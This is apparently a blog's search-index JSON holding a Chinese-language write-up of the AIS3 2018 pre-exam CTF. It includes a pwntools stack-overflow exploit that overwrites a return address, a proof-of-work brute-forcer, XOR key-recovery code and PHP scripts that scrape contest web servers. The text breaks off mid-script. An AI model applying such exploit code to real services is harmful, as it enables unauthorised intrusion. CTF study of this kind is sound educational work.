{
    "docs": [
        {
            "location": "/", 
            "text": "Home\n\n\nWelcome to Lys0829's Blog", 
            "title": "Home"
        }, 
        {
            "location": "/#home", 
            "text": "", 
            "title": "Home"
        }, 
        {
            "location": "/#welcome-to-lys0829s-blog", 
            "text": "", 
            "title": "Welcome to Lys0829's Blog"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/", 
            "text": "AIS3 Pre-exam 2018\n\n\n\u51fa\u984c\u8005\u597d\u58deww\n\n\nMisc1\n\n\n\u9001\u5206\u984c\uff0c\u76f4\u63a5\u7d66flag\n\n\nMisc2\n\n\n\u4e00\u5f35jpg\uff0c\u88e1\u97623\u500b\u5047flag\n\u901a\u5e38\u9019\u7a2e\u984c\u76ee\u6211\u90fd\u6703\u5148\u7528binwalk\u770b\u770b\uff0c\u7d50\u679c\u767c\u73fe\u6709zip\uff0c\u60f3\u8aaa\u628a\u5b83\u62ff\u51fa\u4f86\u89e3\u58d3\u7e2e\uff0c\u7d50\u679c\u8981\u5bc6\u78bc\uff0c\u672c\u4f86\u60f3\u8aaa\u662f\u507d\u52a0\u5bc6\uff0c\u628abinary\u6539\u4e00\u4e0b\u61c9\u8a72\u5c31\u597d\u4e86\uff0c\u7d50\u679c\u6539\u4e86\u9084\u662f\u6253\u4e0d\u958b\uff0c\u5c31\u5148\u653e\u4e00\u908a\n\u5f8c\u4f86\u7d66\u4e86\u63d0\u793a\uff0c\u8aaa\u770b\u770b\u5716\u7247\u88e1\u5047flag\u7684\u4e0b\u9762\uff0c\u4ed4\u7d30\u4e00\u770b\uff0c\u7adf\u7136\u662f\u6469\u65af\u5bc6\u78bc......\n\n.- .. ... ...-- -.-- --- ..- ..-. .. -. -.. - ..... . .-. . .- .-.. ..-. .-.. .- --. --- .... -.-- . .- ....\n\n\u56e0\u70ba\u756b\u8cea\u4e0d\u592a\u597d\uff0c\u6709\u4e9b\u53ef\u80fd\u6709\u770b\u932f\uff0c\u7a0d\u5fae\u8166\u88dc\u4e00\u4e0b\nFlag:\nAIS3{YOUFINDTHEREALFLAGOHYEAH}\n\n\nMisc3\n\n\nMP3stego\n\u76f4\u63a5\u7528\u5c31\u6709\u4e86\n\n\nPwn1\n\n\n\u6709\u4e00\u500bfunction\u6703\u8f38\u51faflag\n\u53ef\u4ee5\u8f38\u5165\u5169\u500b\u5b57\u4e32\uff0c\u662f\u7528gets\uff0c\u591a\u7684\u6771\u897f\u5c31\u76f4\u63a5\u5f9estack\u84cb\u904e\u53bb\u4e86\uff0c\u6240\u4ee5\u5c31\u628amain\u7684return address\u84cb\u6210\u8f38\u51faflag\u7684function\u5c31\u884c\u4e86\nexplotion:\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nr\n \n=\n \nremote\n(\n104.199.235.135\n,\n2111\n)\n\n\naddr\n \n=\n \n0x400797\n\n\npayload\n \n=\n \na\n*\n840\n+\np64\n(\naddr\n)\n\n\nprint\n \nr\n.\nrecvuntil\n(\n:\n)\n\n\nr\n.\nsendline\n(\na\n)\n\n\nprint\n \nr\n.\nrecvuntil\n(\n:\n)\n\n\nprint\n \npayload\n\n\nr\n.\nsendline\n(\npayload\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\nReverse1\n\n\n\u76f4\u63a5ctrl+F\uff0c\u627e\nAIS3{\n\uff0c\u5c31\u6703\u627e\u5230\uff0c\u4f46\u662f\u6709\u4e00\u5806\u5047\u7684\n\n\nReverse2\n\n\n\u76f4\u63a5\u7528IDA pro decompile\uff0c\u770b\u5230\u9019\u6a23\u7684\u6771\u897f:\n\n\nvoid\n \ninit\n()\n\n\n{\n\n  \nsigned\n \nint\n \ni\n;\n \n// [sp+Ch] [bp-4h]@1\n\n\n  \nsrand\n(\n0\n);\n\n  \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n=\n \n84\n;\n \n++\ni\n \n)\n\n  \n{\n\n    \nsecret\n[\ni\n]\n \n+=\n \n5\n;\n\n    \nsecret\n[\ni\n]\n \n=\n \n1\n;\n\n    \nsecret\n[\ni\n]\n \n-=\n \n10\n;\n\n    \nsecret\n[\ni\n]\n \n=\n \n2\n;\n\n  \n}\n\n\n}\n\n\n\n//----- (0000000000000930) ----------------------------------------------------\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nint\n \nresult\n;\n \n// eax@10\n\n  \n__int64\n \nv4\n;\n \n// rsi@10\n\n  \nint\n \nv5\n;\n \n// [sp+4h] [bp-1Ch]@7\n\n  \nint\n \ni\n;\n \n// [sp+8h] [bp-18h]@3\n\n  \nint\n \nv7\n;\n \n// [sp+Ch] [bp-14h]@7\n\n  \nFILE\n \n*\nstream\n;\n \n// [sp+10h] [bp-10h]@1\n\n  \n__int64\n \nv9\n;\n \n// [sp+18h] [bp-8h]@1\n\n\n  \nv9\n \n=\n \n*\nMK_FP\n(\n__FS__\n,\n \n40LL\n);\n\n  \nstream\n \n=\n \nfopen\n(\n/tmp/secret\n,\n \nw\n);\n\n  \ninit\n();\n\n  \nputs\n(\n========== WELCOME TO MY MIND ==========\n);\n\n  \nputs\n(\nTry to find out secret in my mind!!!\n);\n\n  \nwhile\n \n(\n \ncnt\n \n!=\n \n85\n \n)\n\n  \n{\n\n    \n__isoc99_scanf\n(\n%d\n,\n \nv5\n);\n\n    \nv7\n \n=\n \nrand\n()\n \n%\n \n2018\n;\n\n    \nif\n \n(\n \nv7\n \n!=\n \nv5\n \n)\n\n    \n{\n\n      \nputs\n(\nGet out!!! You don\nt know me.\n);\n\n      \ngoto\n \nLABEL_10\n;\n\n    \n}\n\n    \nsecret\n[\ncnt\n]\n \n^=\n \nv5\n;\n\n    \nputs\n(\nNice try! Next one.\n);\n\n    \n++\ncnt\n;\n\n  \n}\n\n  \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n=\n \n84\n;\n \n++\ni\n \n)\n\n    \nfputc\n((\nunsigned\n \n__int8\n)\nsecret\n[\ni\n],\n \nstream\n);\n\n  \nputs\n(\nYou know the flag~~~\n);\n\n\nLABEL_10\n:\n\n  \nresult\n \n=\n \n0\n;\n\n  \nv4\n \n=\n \n*\nMK_FP\n(\n__FS__\n,\n \n40LL\n)\n \n^\n \nv9\n;\n\n  \nreturn\n \nresult\n;\n\n\n}\n\n\n\n\n\n\n\u95dc\u9375\u5728srand(0)\uff0c\u9019\u4ee3\u8868\u4e0d\u662f\u96a8\u6a5f\uff0c\u6240\u4ee5\u5c31\u5beb\u4e00\u500b\u4e00\u6a23\u7684\u5c31\u597d\n\n\n#include\nbits/stdc++.h\n\n\nusing\n \nnamespace\n \nstd\n;\n\n\nint\n \nmain\n(){\n\n    \nsrand\n(\n0\n);\n\n    \nfor\n(\nint\n \ni\n=\n0\n;\ni\n=\n84\n;\ni\n++\n){\n\n        \ncout\nrand\n()\n%\n2018\nendl\n;\n\n    \n}\n\n    \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\n\u76f4\u63a5\n$ ./exploit | ./secret\n\n\nCrypto1\n\n\nPOW\nproof of work\n\n\n==================== proof of work ====================\nplease give me an x satisfying the following condition\ncondition : x[:6] == \n0H1O4K\n and hashlib.sha256(x).hexdigest()[:6] == \n000000\n\nx =\n\n\n\n\n\n\u524d\u7db4\u6bcf\u6b21\u90fd\u4e0d\u540c\n\u5c31\u771f\u7684\u662fproof of work\uff0c\u76f4\u63a5\u786c\u5e79\n\n\nimport\n \nhashlib\n\n\nimport\n \nrandom\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nr\n \n=\n \nremote\n(\n104.199.235.135\n,\n20000\n)\n\n\n\ndic\n \n=\n \n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\n\n\n\nsuffix\n \n=\n \n5KAJTC\n\n\n#suffix = raw_input();\n\n\nprefix\n \n=\n \n28KVRZ9JZ1\n\n\n\nr\n.\nrecvline\n()\n\n\nr\n.\nrecvline\n()\n\n\ntext\n \n=\n \nr\n.\nrecvline\n()\n\n\nsuffix\n \n=\n \n(\ntext\n[\n22\n:])[:\n6\n]\n\n\n#condition : x[:6] == \nGZLXFZ\n and hashlib.sha256(x).hexdigest()[:6] == \n000000\n\n\nprint\n \nsuffix\n\n\nr\n.\nrecvuntil\n(\n= \n)\n\n\n\n\ns\n \n=\n \nsuffix\n+\nprefix\n\n\nhash\n \n=\n \nhashlib\n.\nsha256\n(\ns\n)\n.\nhexdigest\n()[:\n6\n]\n\n\n\nok\n \n=\n \nFalse\n\n\n\nfor\n \na\n \nin\n \nrange\n(\n0\n,\n36\n):\n\n    \nif\n \nok\n:\n\n        \nbreak\n;\n\n    \nfor\n \nb\n \nin\n \nrange\n(\n0\n,\n36\n):\n\n        \nif\n \nok\n:\n\n            \nbreak\n;\n\n        \nfor\n \nc\n \nin\n \nrange\n(\n0\n,\n36\n):\n\n            \nif\n \nok\n:\n\n                \nbreak\n;\n\n            \nfor\n \nd\n \nin\n \nrange\n(\n0\n,\n36\n):\n\n                \nif\n \nok\n:\n\n                    \nbreak\n;\n\n                \nfor\n \ne\n \nin\n \nrange\n(\n0\n,\n36\n):\n\n                    \nprefix\n \n=\n \ndic\n[\na\n]\n+\ndic\n[\nb\n]\n+\ndic\n[\nc\n]\n+\ndic\n[\nd\n]\n+\ndic\n[\ne\n]\n\n                    \ns\n \n=\n \nsuffix\n+\nprefix\n\n                    \nhash\n \n=\n \nhashlib\n.\nsha256\n(\ns\n)\n.\nhexdigest\n()[:\n6\n]\n\n                    \n#print hash\n\n                    \nif\n \nhash\n \n==\n000000\n:\n\n                        \nprint\n \ns\n\n                        \nok\n \n=\n \nTrue\n;\n\n                        \nbreak\n;\n\n\n\n\nr\n.\nsendline\n(\ns\n)\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\nCrypto2\n\n\nXOR\n\u9019\u597d\u50cf\u662f\u6211\u7b2c\u4e00\u6b21\u9019\u9ebc\u8a8d\u771f\u89e3crypto\u5427\uff0c\u4ee5\u524d\u5927\u6982\u90fd\u76f4\u63a5\u8df3\u904e\n\u984c\u76ee\u7d66\u4e86\u5169\u500b\u6a94\u6848\uff0c\u52a0\u5bc6\u5f8c\u7684\u6771\u897f\u8ddf\u52a0\u5bc6\u7a0b\u5f0f\nencrypt:\n\n\n#!/usr/bin/env python3\n\n\nimport\n \nos\n\n\nimport\n \nrandom\n\n\n\nwith\n \nopen\n(\nflag\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nflag\n \n=\n \ndata\n.\nread\n()\n\n    \nassert\n(\nflag\n.\nstartswith\n(\nb\nAIS3{\n))\n\n\n\ndef\n \nextend\n(\nkey\n,\n \nL\n):\n\n    \nkL\n \n=\n \nlen\n(\nkey\n)\n\n    \nreturn\n \nkey\n \n*\n \n(\nL\n \n//\n \nkL\n)\n \n+\n \nkey\n[:\nL\n \n%\n \nkL\n]\n\n\n\ndef\n \nxor\n(\nX\n,\n \nY\n):\n\n    \nreturn\n \nbytes\n([\nx\n \n^\n \ny\n \nfor\n \nx\n,\n \ny\n \nin\n \nzip\n(\nX\n,\n \nY\n)])\n\n\n\nkey\n \n=\n \nos\n.\nurandom\n(\nrandom\n.\nrandint\n(\n8\n,\n \n12\n))\n\n\nplain\n \n=\n \nflag\n \n+\n \nkey\n\n\nkey\n \n=\n \nextend\n(\nkey\n,\n \nlen\n(\nplain\n))\n\n\ncipher\n \n=\n \nxor\n(\nplain\n,\n \nkey\n)\n\n\n\nwith\n \nopen\n(\nflag-encrypted\n,\n \nwb\n)\n \nas\n \ndata\n:\n\n    \ndata\n.\nwrite\n(\ncipher\n)\n\n\n\n\n\n\n\u89c0\u5bdf\u5f8c\u6703\u767c\u73fe\uff0c\u5b83\u7684\u52a0\u5bc6\u65b9\u5f0f\u662f\u5148\u96a8\u6a5f\u7522\u4e00\u500bkey\uff0c\u9577\u5ea6\u662f8~12\u96a8\u6a5f\u9078\uff0c\u7136\u5f8c\u6703\u628aflag\u8ddfkey\u653e\u5728\u4e00\u8d77\u7576\u6210\u88ab\u52a0\u5bc6\u7684\u539f\u6587\uff0c\u7136\u5f8c\u52a0\u5bc6\u7684key\u5247\u662f\u900f\u904e\u91cd\u8907\u63a5\u597d\u5e7e\u6b21\u4f86\u8b8a\u6210\u8ddf\u539f\u6587\u4e00\u6a23\u9577\uff0c\u7136\u5f8c\u505axor\u5f97\u5230\u5bc6\u6587\n\u601d\u8003\u4e86\u4e00\u4e0b\uff0c\u6211\u5011\u6709\u4e00\u9ede\u5df2\u77e5\u7684\u660e\u6587:\nAIS3{\n\uff0c\u800c\u9019\u4e32\u660e\u6587\u4e5f\u4f4d\u65bc\u6574\u500b\u5bc6\u6587\u7684\u958b\u982d\uff0c\u56e0\u6b64\u6211\u5011\u53ef\u4ee5\u5c07\u5bc6\u6587\u7684\u524d5\u500bbyte\u8ddf\u9019\u4e32\u660e\u6587\u505axor\uff0c\u9019\u6a23\u5c31\u80fd\u5f97\u5230key\u7684\u524d5\u500bbyte:\n16 09 7c c7 dd\n\n\u63a5\u8457\u5f97\u60f3\u8fa6\u6cd5\u77e5\u9053key\u5be6\u969b\u5230\u5e95\u591a\u9577\uff0c\u6211\u5011\u5df2\u7d93\u77e5\u9053\u52a0\u5bc6\u7684key\u662f\u7531\u539f\u672c\u7684key\u91cd\u8907\u5f88\u591a\u6b21\u4e32\u8d77\u4f86\u7684\uff0c\u4e5f\u5c31\u662f\u8aaa\u5728\u4e2d\u9593\u9084\u6709\u5f88\u591a\u6bb5\u662f\u4e00\u6a23\u7528\u9019\u4e94\u500bbyte\u4f86\u52a0\u5bc6\u7684\uff0c\u800c\u5982\u679c\u662fflag\uff0c\u5c31\u7b97\u53ea\u6709\u4e94\u500b\u5b57\u5143\u61c9\u8a72\u4e5f\u662f\u80fd\u5920\u5206\u8fa8\u51fa\u4f86\uff0c\u6240\u4ee5\u5c31\u5beb\u4e00\u500bscript\uff0c\u628a\u5bc6\u6587\u5f9e\u982d\u5230\u5c3e\u90fd\u8a66\u8a66\u770b\n\n\nimport\n \nos\n\n\nimport\n \nrandom\n\n\n\nwith\n \nopen\n(\n5key\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nkey5\n \n=\n \ndata\n.\nread\n()\n\n\nwith\n \nopen\n(\nflag-encrypted\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nflag\n \n=\n \ndata\n.\nread\n()\n\n\n\ndef\n \nextend\n(\nkey\n,\n \nL\n):\n\n    \nkL\n \n=\n \nlen\n(\nkey\n)\n\n    \nreturn\n \nkey\n \n*\n \n(\nL\n \n//\n \nkL\n)\n \n+\n \nkey\n[:\nL\n \n%\n \nkL\n]\n\n\n\ndef\n \nxor\n(\nX\n,\n \nY\n):\n\n    \nreturn\n \nbytes\n([\nx\n \n^\n \ny\n \nfor\n \nx\n,\n \ny\n \nin\n \nzip\n(\nX\n,\n \nY\n)])\n\n\n\nfor\n \ni\n \nin\n \nrange\n(\n0\n,\nlen\n(\nflag\n)\n-\n5\n):\n\n    \nplain\n \n=\n \nflag\n[\ni\n:\ni\n+\n5\n+\n1\n]\n\n    \ncipher\n \n=\n \nxor\n(\nkey5\n,\nplain\n)\n\n    \nprint\n(\n%d\n : \n%s\n \n%\n \n(\ni\n,\ncipher\n))\n\n\n\n\n\n\n\u8dd1\u51fa\u4f86\u7684\u7d50\u679c(\u4e2d\u9593\u7701\u7565\u4e00\u4e9b\u4e0d\u662fflag\u7684\u6771\u897f):\n\n\n0\n \n:\n \nb\nAIS3{\n\n\n1\n \n:\n \nb\nV\n\\x88a\\xf1\n\n\n2\n \n:\n \nb\n9\\xfd\\xda\\xeb\\x92\n\n\n3\n \n:\n \nb\n\\xe2\\xafP\\x88?\n\n\n4\n \n:\n \nb\n\\xb0%3%\\x0e\n\n\n5\n \n:\n \nb\n:F\\x9e\\x14c\n\n\n10\n \n:\n \nb\nIn aM\n\n\n20\n \n:\n \nb\n - Wh\n\n\n30\n \n:\n \nb\nR Hap\n\n\n40\n \n:\n \nb\nt0mOR\n\n\n50\n \n:\n \nb\nOU mU\n\n\n60\n \n:\n \nb\n0Mis3\n\n\n70\n \n:\n \nb\nn3 tH\n\n\n80\n \n:\n \nb\nTH4T \n\n\n90\n \n:\n \nb\niLL s\n\n\n100\n \n:\n \nb\nho Y0\n\n\n110\n \n:\n \nb\n. Not\n\n\n120\n \n:\n \nb\nRfect\n\n\n130\n \n:\n \nb\nIER, \n\n\n140\n \n:\n \nb\n gOOD\n\n\n150\n \n:\n \nb\n}\\x16\\t|\\xc7\n\n\n155\n \n:\n \nb\n\\x84h\\xc0\\xf2\\x85\n\n\n\n\n\n\n\u9019\u6a23\u6211\u5011\u5c31\u80fd\u7b97\u51fakey\u7684\u9577\u5ea6\u662f10\uff0c\u56e0\u70ba\u5169\u6b21\u6b63\u78ba\u89e3\u5bc6\u4e4b\u9593\u5dee\u4e8610\u500bbyte\n\u63a5\u8457\u6211\u5011\u9084\u80fd\u767c\u73feflag\u7684\u9577\u5ea6\u662f151\uff0c\u6700\u5f8c\u505c\u5728150\u7684\u4f4d\u7f6e\uff0c\u56e0\u70ba\u9019\u6a23\u7684\u504f\u79fb\uff0c\u4f7f\u6211\u5011\u80fd\u5920\u7b97\u51fa\u5b8c\u6574flag\uff0c\u4e0b\u9762\u7528\u4e00\u5f35\u8868\u4f86\u8aaa\u660e\n\u9019\u5f35\u8868\u4f7f\u7528kn\u4f86\u4ee3\u8868key\u7684\u7b2cn\u500bbyte\n\n\n\n\n\n\n\n\n\u539f\u6587\n\n\n}\n\n\nk1\n\n\nk2\n\n\nk3\n\n\nk4\n\n\nk5\n\n\nk6\n\n\n\n\n\n\n\n\n\n\n\u52a0\u5bc6\u7528\u7684key\n\n\nk1\n\n\nk2\n\n\nk3\n\n\nk4\n\n\nk5\n\n\nk6\n\n\nk7\n\n\n\n\n\n\n\u5bc6\u6587\n\n\n}^k1\n\n\nk1^k2\n\n\nk2^k3\n\n\nk3^k4\n\n\nk4^k5\n\n\nk5^k6\n\n\nk6^k7\n\n\n\n\n\n\n\n\n\u5148\u770b\u539f\u6587\u70bak5\u7684\u90a3\u500bbyte\uff0c\u5c07\u90a3\u500bbyte\u7684\u5bc6\u6587\u8ddfk5\u505axor\uff0c\u5c31\u80fd\u5f97\u5230k6\n\u6709\u4e86k6\uff0c\u5c31\u53ef\u4ee5\u5728\u5f80\u4e0b\u4e00\u500bbyte\u7b97\u51fak7\uff0c\u5982\u6b64\u4e0b\u53bb\uff0c\u5c31\u80fd\u7b97\u51fa\u5b8c\u6574\u7684key\u4e86\uff0c\u6709\u4e86\u5b8c\u6574\u7684key\uff0c\u5c31\u80fd\u89e3\u51fa\u539f\u6587\n\n\n\u627e\u51fakey\u7684code:\n\n\nimport\n \nos\n\n\nimport\n \nrandom\n\n\nwith\n \nopen\n(\n5key\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nkey5\n \n=\n \ndata\n.\nread\n()\n\n\nwith\n \nopen\n(\nflag-encrypted\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nflag\n \n=\n \ndata\n.\nread\n()\n\n\n\ndef\n \nextend\n(\nkey\n,\n \nL\n):\n\n    \nkL\n \n=\n \nlen\n(\nkey\n)\n\n    \nreturn\n \nkey\n \n*\n \n(\nL\n \n//\n \nkL\n)\n \n+\n \nkey\n[:\nL\n \n%\n \nkL\n]\n\n\n\ndef\n \nxor\n(\nX\n,\n \nY\n):\n\n    \nreturn\n \nbytes\n([\nx\n \n^\n \ny\n \nfor\n \nx\n,\n \ny\n \nin\n \nzip\n(\nX\n,\n \nY\n)])\n\n\n\nkey\n \n=\n \nkey5\n\n\nwith\n \nopen\n(\nkey\n,\n \n+wb\n)\n \nas\n \ndata\n:\n\n    \ndata\n.\nwrite\n(\nkey\n)\n\n    \nfor\n \ni\n \nin\n \nrange\n(\n155\n,\n160\n):\n\n        \ntk\n \n=\n \nbytes\n([\nkey\n[\n4\n+\ni\n-\n155\n]\n^\nflag\n[\ni\n]])\n\n        \ndata\n.\nwrite\n(\ntk\n)\n\n        \nkey\n \n=\n \nkey\n+\ntk\n\n\n\n\n\n\n\u89e3\u5bc6\u7684code:\n\n\nimport\n \nos\n\n\nimport\n \nrandom\n\n\nwith\n \nopen\n(\nkey\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nkey\n \n=\n \ndata\n.\nread\n()\n\n\nwith\n \nopen\n(\nflag-encrypted\n,\n \nrb\n)\n \nas\n \ndata\n:\n\n    \nflag\n \n=\n \ndata\n.\nread\n()\n\n\n\ndef\n \nextend\n(\nkey\n,\n \nL\n):\n\n    \nkL\n \n=\n \nlen\n(\nkey\n)\n\n    \nreturn\n \nkey\n \n*\n \n(\nL\n \n//\n \nkL\n)\n \n+\n \nkey\n[:\nL\n \n%\n \nkL\n]\n\n\n\ndef\n \nxor\n(\nX\n,\n \nY\n):\n\n    \nreturn\n \nbytes\n([\nx\n \n^\n \ny\n \nfor\n \nx\n,\n \ny\n \nin\n \nzip\n(\nX\n,\n \nY\n)])\n\n\n\nplain\n \n=\n \nflag\n\n\nkey\n \n=\n \nextend\n(\nkey\n,\n \nlen\n(\nplain\n))\n\n\ncipher\n \n=\n \nxor\n(\nplain\n,\n \nkey\n)\n\n\nprint\n(\ncipher\n)\n\n\nwith\n \nopen\n(\nflag\n,\n \nwb\n)\n \nas\n \ndata\n:\n\n    \ndata\n.\nwrite\n(\ncipher\n)\n\n\n\n\n\n\nFlag: \nAIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.}\n\n\u8d85\u7d1a\u9577\n\n\nWeb1\n\n\nhttp://104.199.235.135:31331/index.php?p=7\n\u9032\u53bb\u6703\u770b\u5230\nDid you see the flag\n\n\u539f\u672c\u4ee5\u70ba\u8ddf\u53bb\u5e74\u4e00\u6a23\u662fhttp 302\uff0c\u7d50\u679c\u4e0d\u662f\n\u5f8c\u4f86\u767c\u73feheader\u6709\nPartial-Flag\n\uff0c\u7136\u5f8c\u6539\u4e86\u4e00\u4e0b\u53c3\u6578\uff0c\u767c\u73fe\u6709\u4e0d\u540c\u7684\u5b57\uff0c\u5beb\u500bscript\u6293\u4e00\u6293\u5c31\u51fa\u4f86\u4e86\n\n\n?php\n\n\n\nfor\n(\n$p\n=\n1\n;\n$p\n=\n2050\n;\n$p\n++\n){\n\n    \n$result\n \n=\n \nget_headers\n(\nhttp://104.199.235.135:31331/index.php?p=\n$p\n,\n \n1\n);\n\n    \necho\n \n$p\n;\n\n    \necho\n \n$result\n[\nPartial-Flag\n];\n\n    \necho\n \n\\n\n;\n\n\n}\n\n\n\n\n\n\nWeb2\n\n\n\u9032\u53bb\u5f8c\u986f\u793a\nThere is a secret page in the website. Can you find it?\n\n\u99ac\u4e0a\u60f3\u5230robots.txt\n\u6253\u958b\u5f8c\u767c\u73fe\n\n\nUser-agent: *\nDisallow: /admin\nDisallow: /cgi-bin/\nDisallow: /images/\nDisallow: /tmp/\nDisallow: /private/\nDisallow: /_hidden_flag_.php\n\n\n\n\n\n\u770b\u4f86\u662f\u5728_hidden_flag_.php\uff0c\u9032\u53bb\u5f8c\u986f\u793a\nHmm ... no flag here!\n\uff0c\u7136\u5f8c\u6709\u500b\u5012\u6578\uff0c\u5012\u6578\u5b8c\u6703\u8df3\u51fa\u4e00\u500b\u6309\u9215\nGet flag in the next page.\n\uff0c\u9ede\u4e0b\u53bb\u5c31\u662f\u4e00\u6a23\u7684\u52d5\u4f5c\uff0c\u4f46\u662f\u5f9e\u539f\u59cb\u78bc\u6703\u767c\u73fe\u9019\u6a23\u7684\u6771\u897f\n\n\nhtml\n\n\nhead\n\n\nmeta\n \ncharset\n=\nutf-8\n/\n\n\nscript\n \ntype\n=\ntext/javascript\n \nsrc\n=\n_hidden_flag_.js\n/\nscript\n\n\n/\nhead\n\n\nbody\n\nHmm ... no flag here!\nform\n \nmethod\n=\npost\n\n\ninput\n \ntype\n=\nhidden\n \nname\n=\nc\n \nvalue\n=\n1\n/\n\n\ninput\n \ntype\n=\nhidden\n \nname\n=\ns\n \nvalue\n=\n3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb\n/\n\n\nspan\n \nid\n=\ndisp\n/\nspan\n\n\n/\nform\n\n\n/\nbody\n\n\n\n\n\n\nhtml\n\n\nhead\n\n\nmeta\n \ncharset\n=\nutf-8\n/\n\n\nscript\n \ntype\n=\ntext/javascript\n \nsrc\n=\n_hidden_flag_.js\n/\nscript\n\n\n/\nhead\n\n\nbody\n\nHmm ... no flag here!\nform\n \nmethod\n=\npost\n\n\ninput\n \ntype\n=\nhidden\n \nname\n=\nc\n \nvalue\n=\n2\n/\n\n\ninput\n \ntype\n=\nhidden\n \nname\n=\ns\n \nvalue\n=\n6d16a8d466b16f456bf9a3faeef31db59612cbb11ce64e0196b07d25ed2cff4e\n/\n\n\nspan\n \nid\n=\ndisp\n/\nspan\n\n\n/\nform\n\n\n/\nbody\n\n\n\n\n\n\n__hidden_flag_.js\n\n\nvar\n \n_0x13ed\n=\n[\ngetElementById\n,\ndisp\n,\nsetInterval\n,\nonload\n,\nclearInterval\n,\ninnerHTML\n,\ninput\\x20type=\\x22submit\\x22\\x20value=\\x22Get\\x20flag\\x20in\\x20the\\x20next\\x20page.\\x22/\n];(\nfunction\n(\n_0x4ff87b\n,\n_0x35e2bc\n){\nvar\n \n_0x2c01be\n=\nfunction\n(\n_0x216360\n){\nwhile\n(\n--\n_0x216360\n){\n_0x4ff87b\n[\npush\n](\n_0x4ff87b\n[\nshift\n]());}};\n_0x2c01be\n(\n++\n_0x35e2bc\n);}(\n_0x13ed\n,\n0x13f\n));\nvar\n \n_0x5d44\n=\nfunction\n(\n_0x592680\n,\n_0x1e9b97\n){\n_0x592680\n=\n_0x592680\n-\n0x0\n;\nvar\n \n_0x50206c\n=\n_0x13ed\n[\n_0x592680\n];\nreturn\n \n_0x50206c\n;};\nvar\n \nleft\n=\n0x0\n;\nvar\n \ntimer\n=\nnull\n;\nvar\n \ndisp\n=\nnull\n;\nfunction\n \ncountdown\n(){\nleft\n=\nleft\n-\n0x1\n;\nif\n(\ntimer\n!=\nnull\nleft\n==\n0x0\n){\nwindow\n[\n_0x5d44\n(\n0x0\n)](\ntimer\n);\ntimer\n=\nnull\n;\ndisp\n[\n_0x5d44\n(\n0x1\n)]\n=\n_0x5d44\n(\n0x2\n);}\nelse\n{\ndisp\n[\n_0x5d44\n(\n0x1\n)]\n=\n(\n+\nleft\n+\n)\n;}}\nfunction\n \nsetup\n(){\ndisp\n=\ndocument\n[\n_0x5d44\n(\n0x3\n)](\n_0x5d44\n(\n0x4\n));\nleft\n=\n0xa\n+\nparseInt\n(\nMath\n[\nrandom\n]()\n*\n0xa\n);\ntimer\n=\nwindow\n[\n_0x5d44\n(\n0x5\n)](\ncountdown\n,\n0x3e8\n);\ndisp\n[\n_0x5d44\n(\n0x1\n)]\n=\n(\n+\nleft\n+\n)\n;}\nwindow\n[\n_0x5d44\n(\n0x6\n)]\n=\nsetup\n;\n\n\n\n\n\n\n\u7136\u5f8c\u5c31\u6703\u767c\u73fepost\u904e\u53bb1\uff0c\u6703\u7d662\uff0cpost\u904e\u53bb2\uff0c\u6703\u7d663\uff0c\u8ddfjavascript\u6839\u672c\u6c92\u95dc\u4fc2\n\u7136\u5f8c\u5728\u4ed4\u7d30\u89c0\u5bdf\u4e00\u4e0bheader\uff0c\u6703\u767c\u73fe\u6709\u4e00\u500b\nFlag: AIS3{NOT_A_VALID_FLAG}\n\uff0c\u5f88\u986f\u7136\u662f\u932f\u7684\uff0c\u90a3\u5c31\u61c9\u8a72\u662f\u591a\u8dd1\u5e7e\u6b21\uff0c\u5c31\u6703\u51fa\u73fe\u5c0d\u7684\u3002\n\u90a3\u5c31\u5beb\u4e00\u500bscript\n\n\n?php\n\n\n\n$url\n \n=\n \n104.199.235.135:31332/_hidden_flag_.php\n;\n\n\n\n$ch\n \n=\n \ncurl_init\n();\n\n\ncurl_setopt\n(\n$ch\n,\n \nCURLOPT_URL\n,\n \n$url\n);\n\n\ncurl_setopt\n(\n$ch\n \n,\n \nCURLOPT_HEADER\n,\n \ntrue\n);\n\n\ncurl_setopt\n(\n$ch\n,\n \nCURLOPT_POST\n,\n \ntrue\n);\n\n\ncurl_setopt\n(\n$ch\n,\n \nCURLOPT_RETURNTRANSFER\n,\n \ntrue\n);\n\n\n\n//$c = \n46828\n;\n\n\n//$s = \n4818d80ac35251a43047417fe68ac4c94aab3586adc8d0b41063f796ecbef122\n;\n\n\n\n$c\n \n=\n \n5521\n;\n\n\n$s\n \n=\n \n56483453de40c26df92cc87deb70b173c405483f2571e8a24d2d48e48f0f0dc4\n;\n\n\n\nwhile\n(\n1\n){\n\n    \ncurl_setopt\n(\n$ch\n,\n \nCURLOPT_POSTFIELDS\n,\n \nhttp_build_query\n(\narray\n(\nc\n=\n$c\n,\n \ns\n=\n$s\n)));\n \n    \n$output\n \n=\n \ncurl_exec\n(\n$ch\n);\n\n    \n//str_replace(array(\n\\r\\n\n,\n\\t\n,\n  \n,\n\\n\n),\n,$output);\n\n    \n//echo $output;\n\n    \npreg_match\n(\n/name=\n\\\nc\n\\\n\\svalue=\n\\\n.+/\n,\n$output\n,\n$cm\n);\n\n    \npreg_match\n(\n/[0-9]+/\n,\n$cm\n[\n0\n],\n$cm\n);\n\n    